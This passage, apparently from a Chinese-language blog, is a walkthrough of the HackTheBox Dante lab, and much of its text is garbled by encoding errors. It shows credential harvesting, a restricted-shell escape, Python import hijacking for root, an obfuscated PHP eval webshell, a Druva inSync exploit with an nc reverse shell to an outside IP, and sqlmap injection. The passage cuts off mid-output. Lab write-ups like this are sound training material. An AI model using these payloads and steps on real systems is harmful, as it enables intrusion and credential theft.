<span class="doctag">@link</span> https://wordpress.org/support/article/editing-wp-config-php/</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@package</span> WordPress</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ** MySQL settings - You can get this info from your web host ** //</span></span><br><span class="line"><span class="comment">/** The name of the database for WordPress */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;DB_NAME&#x27;</span> <span class="string">&#x27;wordpress&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL database username */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;margaret&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL database password */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;Welcome1!2@3#&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL hostname */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;DB_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Database Charset to use in creating database tables. */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;DB_CHARSET&#x27;</span>, <span class="string">&#x27;utf8&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** The Database Collate type. Don&#x27;t change this if in doubt. */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;DB_COLLATE&#x27;</span>, <span class="string">&#x27;&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/**#@+</span></span><br><span class="line"><span class="comment"> * Authentication Unique Keys and Salts.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Change these to different unique phrases!</span></span><br><span class="line"><span class="comment"> * You can generate these using the &#123;<span class="doctag">@link</span> https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service&#125;</span></span><br><span class="line"><span class="comment"> * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.6.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;AUTH_KEY&#x27;</span>,         <span class="string">&#x27;put your unique phrase here&#x27;</span> );</span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;SECURE_AUTH_KEY&#x27;</span>,  <span class="string">&#x27;put your unique phrase here&#x27;</span> );</span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;LOGGED_IN_KEY&#x27;</span>,    <span class="string">&#x27;put your unique phrase here&#x27;</span> );</span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;NONCE_KEY&#x27;</span>,        <span class="string">&#x27;put your unique phrase here&#x27;</span> );</span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;AUTH_SALT&#x27;</span>,        <span class="string">&#x27;put your unique phrase here&#x27;</span> );</span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;SECURE_AUTH_SALT&#x27;</span>, <span class="string">&#x27;put your unique phrase here&#x27;</span> );</span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;LOGGED_IN_SALT&#x27;</span>,   <span class="string">&#x27;put your unique phrase here&#x27;</span> );</span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;NONCE_SALT&#x27;</span>,       <span class="string">&#x27;put your unique phrase here&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/**#@-*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * WordPress Database Table prefix.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * You can have multiple installations in one database if you give each</span></span><br><span class="line"><span class="comment"> * a unique prefix. Only numbers, letters, and underscores please!</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="variable">$table_prefix</span> = <span class="string">&#x27;wp_&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * For developers: WordPress debugging mode.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Change this to true to enable the display of notices during development.</span></span><br><span class="line"><span class="comment"> * It is strongly recommended that plugin and theme developers use WP_DEBUG</span></span><br><span class="line"><span class="comment"> * in their development environments.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * For information on other constants that can be used for debugging,</span></span><br><span class="line"><span class="comment"> * visit the documentation.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@link</span> https://wordpress.org/support/article/debugging-in-wordpress/</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;WP_DEBUG&#x27;</span>, <span class="literal">false</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/* That&#x27;s all, stop editing! Happy publishing. */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/** Absolute path to the WordPress directory. */</span></span><br><span class="line"><span class="keyword">if</span> ( ! <span class="title function_ invoke__">defined</span>( <span class="string">&#x27;ABSPATH&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="title function_ invoke__">define</span>( <span class="string">&#x27;ABSPATH&#x27;</span>, <span class="keyword">__DIR__</span> . <span class="string">&#x27;/&#x27;</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Sets up WordPress vars and included files. */</span></span><br><span class="line"><span class="keyword">require_once</span> ABSPATH . <span class="string">&#x27;wp-settings.php&#x27;</span>;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ä¸€ç»„å¸å·å¯†ç ï¼šmargaret:Welcome1!2@3#ï¼Œè¿˜è®°å¾—æˆ‘ä»¬ä¹‹å‰åœ¨&#x2F;etc&#x2F;passwdçœ‹åˆ°çš„é‚£ä¸ªè´¦æˆ·å—ï¼Ÿä¹‹åæˆ‘ä»¬å°±é€šè¿‡sshæ¥è¿ä¸Šå»ï¼š</p><p><a href="https://pic.imgdb.cn/item/6461e7f70d2dde5777d9ae9a.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6461e7f70d2dde5777d9ae9a.jpg"></a></p><p>æç¤ºæˆ‘ä»¬å½“å‰å¤„äºå—é™åˆ¶çš„shellä¸­ï¼Œé‚£æ¥ä¸‹æ¥å°±æ˜¯é€ƒé€¸lshelläº†ã€‚é€šè¿‡googleï¼Œæˆ‘æ‰¾åˆ°äº†ä¸€ç§é€ƒé€¸æ–¹æ³•ï¼Œé¦–å…ˆè¿›å…¥vimï¼Œä¹‹åæ‰§è¡Œä¸‹é¢ä¸¤å¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">:set shell=/bin/bash</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure><p>ä¹‹åæˆ‘ä»¬å°±å¾—åˆ°äº†&#x2F;bin&#x2F;bashè¿™ä¸ªshelläº†ï¼š</p><p><a href="https://pic.imgdb.cn/item/6461e8b30d2dde5777dab5e8.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6461e8b30d2dde5777dab5e8.jpg"></a></p><p>ä¹‹åcat flag.txtåˆæ‹¿åˆ°äº†ä¸€ä¸ªflagã€‚</p><h3 id="Snake-it-â€˜til-you-make-it"><a href="#Snake-it-â€˜til-you-make-it" class="headerlink" title="Snake it â€˜til you make it"></a>Snake it â€˜til you make it</h3><p>åœ¨margaretçš„ç”¨æˆ·ç›®å½•ä¸‹ï¼Œå­˜åœ¨ä¸€ä¸ª.configç›®å½•ï¼Œè¿›å…¥.configç›®å½•ï¼Œå‘ç°ä½¿ç”¨äº†Slackï¼Œå…³äºSlackçš„ä¿¡æ¯å¸ˆå‚…ä»¬å¯ä»¥è‡ªè¡Œç™¾åº¦ã€‚å¯ä»¥æ‰¾åˆ°ç¼“å­˜çš„æ–‡ä»¶~&#x2F;.config&#x2F;Slack&#x2F;exported_data&#x2F;secure&#x2F;2020-05-18.jsonï¼Œé‡Œé¢æœ‰ä¸€äº›Frankå’ŒMargaretçš„å¯¹è¯ï¼Œé€šè¿‡å¯¹è¯å¯ä»¥æ¨ç†å¾—çŸ¥ï¼Œè¿™å°æœºå™¨æ­£æ˜¯è¿ç§»ä¹‹åçš„ubuntué•œåƒä¸»æœºï¼Œè€Œfrankçš„å¯†ç TractorHeadtorchDeskmatåœ¨ç¼“å­˜æ–‡ä»¶é‡Œé¢ä¹Ÿè¢«Margaretè¯´å‡ºï¼Œæˆ‘ä»¬ç›´æ¥çœ‹è¿™é‡Œï¼š</p><p><a href="https://pic.imgdb.cn/item/6461ea9e0d2dde5777dce569.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6461ea9e0d2dde5777dce569.jpg"></a></p><p>ä¹‹åæˆ‘ä»¬ç™»å½•ä¸Šfrankï¼š</p><p><a href="https://pic.imgdb.cn/item/6461eac90d2dde5777dd10aa.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6461eac90d2dde5777dd10aa.jpg"></a></p><p>ä¸Šä¼ pspyå¹¶è¿è¡Œï¼Œå¯ä»¥çœ‹åˆ°æœ‰è¿™ä¹ˆä¸€ä¸ªè¿›ç¨‹ï¼š</p><p><a href="https://pic.imgdb.cn/item/6461eb600d2dde5777ddad21.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6461eb600d2dde5777ddad21.jpg"></a></p><p>åœ¨pspyä¸­ï¼Œæˆ‘ä»¬å‘ç°è¿™ä¸ªè¿›ç¨‹æ¯éš”ä¸€æ®µæ—¶é—´å°±ä¼šå¯åŠ¨ï¼Œå¹¶ä¸”æ˜¯UID&#x3D;0ï¼ˆrootï¼‰æ¥å¯åŠ¨è¿™ä¸ªè¿›ç¨‹ã€‚ä½†æ˜¯æˆ‘ä»¬ä¸èƒ½ç›´æ¥ä¿®æ”¹apache_restart.pyï¼Œå› ä¸ºæƒé™ä¸å¤Ÿï¼š</p><p><a href="https://pic.imgdb.cn/item/6461ecb90d2dde5777df4d44.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6461ecb90d2dde5777df4d44.jpg"></a></p><p>é‚£å°±çœ‹ä¸€ä¸‹apache_restart.pyçš„å†…å®¹å§ï¼š</p><p><a href="https://pic.imgdb.cn/item/6461edc30d2dde5777e0c31d.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6461edc30d2dde5777e0c31d.jpg"></a></p><p>æ¥ä¸‹æ¥æƒ³è¦ææƒï¼Œé¦–å…ˆæˆ‘ä»¬éœ€è¦äº†è§£pythonå¯¼åŒ…çš„æœç´¢é¡ºåºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">åœ¨å½“å‰ç›®å½•ä¸‹æœç´¢è¯¥æ¨¡å—</span><br><span class="line">åœ¨ç¯å¢ƒå˜é‡ PYTHONPATH ä¸­æŒ‡å®šçš„è·¯å¾„åˆ—è¡¨ä¸­ä¾æ¬¡æœç´¢</span><br><span class="line">åœ¨ Python å®‰è£…è·¯å¾„çš„ lib åº“ä¸­æœç´¢</span><br></pre></td></tr></table></figure><p>è™½ç„¶æˆ‘ä»¬ä¸èƒ½ç›´æ¥ä¿®æ”¹apache_restart.pyï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥åœ¨&#x2F;home&#x2F;frankçš„è·¯å¾„ä¸‹é¢æ·»åŠ pyåŒ…å‘¢ã€‚å› æ­¤ææƒæ€è·¯å°±æ˜¯ï¼Œåœ¨&#x2F;home&#x2F;frankçš„ç›®å½•ä¸‹æ·»åŠ ä¸€ä¸ªurllib.pyï¼Œå†…å®¹å¯ä»¥æ˜¯åå¼¹shellï¼Œä¹Ÿå¯ä»¥æ˜¯åˆ«çš„ï¼Œåªè¦ä½ èƒ½æ‹¿åˆ°rootçš„shellå³å¯ï¼Œæˆ‘è¿™é‡Œæ˜¯ç»™&#x2F;bin&#x2F;bashè®¾ç½®suidä½ï¼š</p><p><a href="https://pic.imgdb.cn/item/6461ee730d2dde5777e18bc0.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6461ee730d2dde5777e18bc0.jpg"></a></p><p>ä¹‹å&#x2F;bin&#x2F;bash -på°±æ‹¿åˆ°rootæƒé™äº†ï¼Œå¯ä»¥çœ‹flagäº†ï¼š</p><p><a href="https://pic.imgdb.cn/item/6462b0890d2dde577711d4be.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6462b0890d2dde577711d4be.jpg"></a></p><p>è‡³æ­¤DANTE-NIX02ä¹Ÿæ‰“å®Œäº†ã€‚</p><h3 id="Feeling-fintastic"><a href="#Feeling-fintastic" class="headerlink" title="Feeling fintastic"></a>Feeling fintastic</h3><p>æ¥ä¸‹æ¥æˆ‘ä»¬çœ‹172.16.1.17ï¼Œfscanæ‰«å‡ºæ¥çš„å¼€æ”¾çš„ç«¯å£æ˜¯80ã€139ã€445ä»¥åŠ10000ã€‚10000ç«¯å£æ˜¯webminæœåŠ¡ï¼Œå¯¹ï¼Œå°±æ˜¯æ¼æ´å¤šçš„ypçš„é‚£ä¸ªã€‚ä½†æ˜¯æ²¡å¸å·å¯†ç ï¼Œæ‹¿ä¸åˆ°shellã€‚å¼€æ”¾äº†445ç«¯å£ï¼Œå°è¯•smbclientè¿ä¸€ä¸‹çœ‹çœ‹èƒ½ä¸èƒ½æ‹¿åˆ°ä»€ä¹ˆä¿¡æ¯ï¼Ÿ</p><p><a href="https://pic.imgdb.cn/item/6461efca0d2dde5777e69fb2.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6461efca0d2dde5777e69fb2.jpg"></a></p><p>æœ‰ä¸€ä¸ªforensicsç›®å½•å…±äº«ï¼Œ<code>proxychains4 smbclient \\\\172.16.1.17\\forensics</code>ï¼š</p><p><a href="https://pic.imgdb.cn/item/6461f2c30d2dde5777f076d7.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6461f2c30d2dde5777f076d7.jpg"></a></p><p>å­˜åœ¨ä¸€ä¸ªæ–‡ä»¶åå«monitorçš„æ–‡ä»¶ï¼ŒæŠŠå®ƒä¸‹è½½ä¸‹æ¥ï¼Œå‘ç°æ˜¯ä¸€ä¸ªæµé‡åŒ…ï¼Œwiresharkåˆ†æä¸€ä¸‹ï¼š</p><p><a href="https://pic.imgdb.cn/item/6461f0b90d2dde5777ea2799.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6461f0b90d2dde5777ea2799.jpg"></a></p><p>å¯ä»¥çœ‹åˆ°ä¸Šé¢è¿™å—é€šè¿‡POSTè¯·æ±‚&#x2F;session_login.cgiä¹‹åå°±GETè¯·æ±‚&#x2F;ï¼ŒçŒœæµ‹æ­¤å¤„çš„POSTè¯·æ±‚ç™»å½•æˆåŠŸäº†ï¼Œé‚£å°±çœ‹ä¸€ä¸‹æœ‰æ²¡æœ‰å¯†ç ï¼š</p><p><a href="https://pic.imgdb.cn/item/6461f0ff0d2dde5777eaec4a.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6461f0ff0d2dde5777eaec4a.jpg"></a></p><p>å¾—åˆ°ä¸€ç»„å¸å·å¯†ç <code>admin:Password6543</code>ï¼Œä¹‹åå»ç™»å½•10000ç«¯å£å¤„çš„webminæœåŠ¡ï¼Œå‘ç°å¯ä»¥æˆåŠŸç™»å½•ã€‚ä¹‹åå°±æ˜¯ç”¨msfçš„exploit&#x2F;linux&#x2F;http&#x2F;webmin_packageup_rceæ¨¡å—æ¥æ‹¿åˆ°meterpreteräº†ï¼š</p><p><a href="https://pic.imgdb.cn/item/6461f2a00d2dde5777f02438.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6461f2a00d2dde5777f02438.jpg"></a></p><p>ç›´æ¥å°±æ˜¯rootæƒé™ï¼ŒDANTE-NIX03ä¹Ÿæ‰“å®Œäº†ã€‚</p><h3 id="Letâ€™s-take-this-discussion-elsewhere"><a href="#Letâ€™s-take-this-discussion-elsewhere" class="headerlink" title="Letâ€™s take this discussion elsewhere"></a>Letâ€™s take this discussion elsewhere</h3><p>æ¥ä¸‹æ¥æˆ‘ä»¬çœ‹172.16.1.13ï¼Œfscançš„æ‰«æç»“æœæ˜¾ç¤ºå¼€æ”¾çš„ç«¯å£ä¸º80ã€443ã€445ï¼Œè¿›å…¥80ç«¯å£ï¼Œæ˜¯ä¸€ä¸ªXAMPPçš„æ¬¢è¿ç•Œé¢ï¼š</p><p><a href="https://pic.imgdb.cn/item/646209df0d2dde57772602b8.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/646209df0d2dde57772602b8.jpg"></a></p><p>smbclientä¹Ÿè¿ä¸ä¸Šï¼Œ443ç«¯å£ä¹Ÿè·Ÿ80ç«¯å£ç•Œé¢ä¸€æ ·ï¼Œé‚£æ¥ä¸‹æ¥å°±çˆ†ç ´ä¸€ä¸‹80ç«¯å£çš„webç›®å½•å§ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[/home/rainb0w/tools/pspy-master]</span><br><span class="line">â””â”€# dirsearch -u http://172.16.1.13/ -t 200 -x 404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --proxy=socks5://127.0.0.1:1080 </span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.2                                                                                                                                                                                                 </span><br><span class="line"> (_||| _) (/_(_|| (_| )                                                                                                                                                                                                          </span><br><span class="line">                                                                                                                                                                                                                                 </span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 200 | Wordlist size: 220545</span><br><span class="line"></span><br><span class="line">Output File: /root/.dirsearch/reports/172.16.1.13/-_23-05-15_06-32-14.txt</span><br><span class="line"></span><br><span class="line">Error Log: /root/.dirsearch/logs/errors-23-05-15_06-32-14.log</span><br><span class="line"></span><br><span class="line">Target: http://172.16.1.13/</span><br><span class="line"></span><br><span class="line">[06:32:15] Starting: </span><br><span class="line">[06:32:17] 301 -  332B  - /img  -&gt;  http://172.16.1.13/img/                </span><br><span class="line">[06:32:20] 301 -  336B  - /discuss  -&gt;  http://172.16.1.13/discuss/        </span><br><span class="line">[06:32:23] 403 -    1KB - /licenses                                        </span><br><span class="line">[06:32:28] 301 -  338B  - /dashboard  -&gt;  http://172.16.1.13/dashboard/    </span><br><span class="line">[06:32:32] 403 -    1KB - /%20                                             </span><br><span class="line">[06:32:32] 301 -  332B  - /IMG  -&gt;  http://172.16.1.13/IMG/                </span><br><span class="line">[06:32:49] 403 -    1KB - /*checkout*                                      </span><br><span class="line">[06:32:57] 301 -  332B  - /Img  -&gt;  http://172.16.1.13/Img/                </span><br><span class="line">[06:33:07] 403 -    1KB - /phpmyadmin                                      </span><br><span class="line">[06:33:25] 403 -    1KB - /webalizer                                       </span><br><span class="line">[06:33:32] 403 -    1KB - /*docroot*                                       </span><br><span class="line">[06:33:36] 403 -    1KB - /*                                               </span><br><span class="line">[06:33:45] 403 -    1KB - /con                                             </span><br><span class="line">[06:33:54] 301 -  338B  - /Dashboard  -&gt;  http://172.16.1.13/Dashboard/    </span><br><span class="line">[06:34:56] 403 -    1KB - /http%3A                                          </span><br><span class="line">[06:35:16] 403 -    1KB - /**http%3a                                        </span><br><span class="line">[06:35:34] 403 -    1KB - /*http%3A                                         </span><br><span class="line">[06:35:36] 301 -  334B  - /xampp  -&gt;  http://172.16.1.13/xampp/             </span><br><span class="line">[06:36:18] 403 -    1KB - /aux                                              </span><br><span class="line">[06:36:59] 403 -    1KB - /**http%3A                                        </span><br><span class="line">[06:37:47] 403 -    1KB - /%C0                                              </span><br><span class="line">[06:40:35] 403 -    1KB - /server-status                                    </span><br><span class="line">[06:41:24] 403 -    1KB - /%3FRID%3D2671</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨dirsearchçˆ†ç ´é™¤äº†ä¸ª&#x2F;discussç›®å½•ï¼Œè¿›å…¥ä¹‹åï¼Œç•Œé¢æ˜¯è¿™æ ·çš„ï¼š</p><p><a href="https://pic.imgdb.cn/item/64620ac20d2dde5777278c1c.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64620ac20d2dde5777278c1c.jpg"></a></p><p>googleä¸€ä¸‹ä¹‹åï¼Œå¯ä»¥æ‰¾åˆ°åˆ©ç”¨æ–¹æ³•ï¼š<a href="https://www.exploit-db.com/exploits/48512">https://www.exploit-db.com/exploits/48512</a>ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬å¼€å§‹æ³¨å†Œï¼Œåœ¨æ³¨å†Œä¸Šä¼ å¤´åƒé‚£é‡Œç›´æ¥ä¸Šä¼ webshellï¼Œåªæ˜¯è¿™é‡Œä¼¼ä¹å­˜åœ¨å…æ€ï¼Ÿç›´æ¥ä¸Šä¼ ä¸€å¥è¯webshellæ— æ³•ä¸Šä¼ æˆåŠŸï¼Œå› æ­¤å°è¯•ç»•è¿‡ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">&amp;<span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$var</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">foo</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªå¾ˆç®€å•çš„å…æ€å°±ç»•è¿‡äº†ï¼Œä¹‹åä¼šæ˜¾ç¤ºæ³¨å†ŒæˆåŠŸçš„ç•Œé¢ï¼š</p><p><a href="https://pic.imgdb.cn/item/64620c650d2dde57772ae1d1.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64620c650d2dde57772ae1d1.jpg"></a></p><p>æ³¨å†ŒæˆåŠŸä¹‹åï¼Œè¿›å…¥&#x2F;discuss&#x2F;upså¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„webshellï¼Œèšå‰‘è¿æ¥ä¹‹åæ‹¿åˆ°shellï¼ˆæ³¨æ„ç»™èšå‰‘é…ç½®ä»£ç†å“¦)ã€‚ä¹‹åå¯ä»¥åœ¨<code>C:\Users\Gerald\Desktop</code>ç›®å½•ä¸‹çœ‹åˆ°flagã€‚</p><h3 id="Compare-my-numbers"><a href="#Compare-my-numbers" class="headerlink" title="Compare my numbers"></a>Compare my numbers</h3><p>å½“å‰æ‹¿åˆ°çš„shellæ˜¯geraldç”¨æˆ·çš„ï¼Œæ¥ä¸‹æ¥å¼€å§‹ææƒã€‚ è¿›å…¥<code>C:\Program Files (x86)</code>ä¹‹åå¯ä»¥çœ‹åˆ°å­˜åœ¨ä¸€ä¸ªDruvaçš„ç›®å½•ï¼š</p><p>åœ¨Druva inSyncçš„windowså®¢æˆ·ç«¯6.6.3ç‰ˆæœ¬ä¸­ï¼Œå­˜åœ¨ç›¸å¯¹è·¯å¾„éå†å…è®¸æœªç»èº«ä»½éªŒè¯çš„æœ¬åœ°æ”»å‡»è€…ä»¥ SYSTEM æƒé™æ‰§è¡Œä»»æ„æ“ä½œç³»ç»Ÿå‘½ä»¤çš„æ¼æ´ã€‚å› æ­¤searchsploitæœç´¢è¿™ä¸ªæ¼æ´ï¼š</p><p><a href="https://pic.imgdb.cn/item/64620ece0d2dde57772dd33a.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64620ece0d2dde57772dd33a.jpg"></a></p><p>æŠŠ48505.txtçš„åç¼€æ”¹ä¸º.pyï¼Œå°†å…¶å’Œncä¸€èµ·ä¸Šä¼ åˆ°é¶æœºä¸Šï¼Œç„¶åæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Python27\python.exe 48505.py &quot;windows\system32\cmd.exe /C C:\xampp\htdocs\discuss\ups\nc64.exe 10.10.14.2 1237 -e cmd.exe&quot;</span><br></pre></td></tr></table></figure><p>æˆåŠŸåå¼¹åˆ°shellï¼Œæ­¤æ—¶æƒé™ä¸ºsystemï¼ŒDANTE-WS01ä¹ŸæˆåŠŸæ‰“å®Œï¼š</p><p><a href="https://pic.imgdb.cn/item/646211080d2dde577730487f.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/646211080d2dde577730487f.jpg"></a></p><h3 id="Again-and-again"><a href="#Again-and-again" class="headerlink" title="Again and again"></a>Again and again</h3><p>æ¥ä¸‹æ¥æˆ‘ä»¬çœ‹172.16.1.12ï¼Œå¼€æ”¾çš„ç«¯å£æœ‰21ã€22ã€80ã€443ä»¥åŠ3306ã€‚è®¿é—®webç•Œé¢ï¼Œå‘ç°ä¸172.16.1.13çš„ç•Œé¢ä¸€æ ·ï¼Œéƒ½æ˜¯XAMPPçš„æ¬¢è¿ç•Œé¢ã€‚å°è¯•çˆ†ç ´ç›®å½•ï¼Œçˆ†ç ´å‡º&#x2F;blogç›®å½•ã€‚ä½¿ç”¨äº†Responsive Blogï¼š</p><p><a href="https://pic.imgdb.cn/item/646212280d2dde577731e0fe.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/646212280d2dde577731e0fe.jpg"></a></p><p>googleä¸€ä¸‹æ‰¾åˆ°äº†å­˜åœ¨çš„æ¼æ´ï¼Œå³<code>http://172.16.1.12/blog/category.php?id=1</code>æ­¤å¤„å­˜åœ¨sqlæ³¨å…¥ï¼Œç›´æ¥sqlmapä¸€æŠŠæ¢­ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://172.16.1.12/blog/category.php?id=1&quot; --proxy=socks5://127.0.0.1:1080 --dbs --batch</span><br><span class="line"></span><br><span class="line">available databases [7]:                                                                                                                                                                             </span><br><span class="line">[*] blog_admin_db</span><br><span class="line">[*] flag</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] phpmyadmin</span><br><span class="line">[*] test</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>flagåœ¨flagæ•°æ®åº“å†…ã€‚</p><h3 id="Five-doctors"><a href="#Five-doctors" class="headerlink" title="Five doctors"></a>Five doctors</h3><p>ä¹‹åçˆ†blog_admin_dbåº“ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Database: blog_admin_db                                                                                                                                                                              </span><br><span class="line">[13 tables]</span><br><span class="line">+-----------------------------+</span><br><span class="line">| banner_posts                |</span><br><span class="line">| blog_categories             |</span><br><span class="line">| blogs                       |</span><br><span class="line">| editors_choice              |</span><br><span class="line">| links                       |</span><br><span class="line">| membership_grouppermissions |</span><br><span class="line">| membership_groups           |</span><br><span class="line">| membership_userpermissions  |</span><br><span class="line">| membership_userrecords      |</span><br><span class="line">| membership_users            |</span><br><span class="line">| page_hits                   |</span><br><span class="line">| titles                      |</span><br><span class="line">| visitor_info                |</span><br><span 